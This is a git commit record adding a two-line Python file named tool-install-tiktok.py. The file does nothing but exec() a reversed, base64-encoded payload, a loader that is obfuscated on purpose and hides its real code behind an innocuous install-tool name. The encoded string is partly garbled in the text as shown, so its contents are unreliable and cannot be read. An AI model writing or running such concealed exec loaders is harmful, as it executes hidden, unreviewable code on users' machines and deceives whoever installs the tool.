0c5dd0c378fa00a44799a0f55f22719d34cff495
Snhvn <snhvnnguyen@gmail.com>
2025-03-30 18:49:58 +0700

    Create tool-install-tiktok.py

---
+++ tool-install-tiktok.py
@@ -0,0 +1,2 @@
+import base64
+exec(base64.b64decode('yh!blۛy&⥫N8r݆iݱ ǫ튖!r>y8"x!xin#kx'aiثy]؞Gw!+b^z^r"N^jr?(ۛzmʋo*Z}yhÊ(m?zޮةir?!w!(zr5N%M:~N%mo(ۛzmʋoh_yhyh)Zv*ihYڙ眆mǭmhVڲ._m nn'rJxo_N)-Oy?杳gjg'[::-1]).decode())
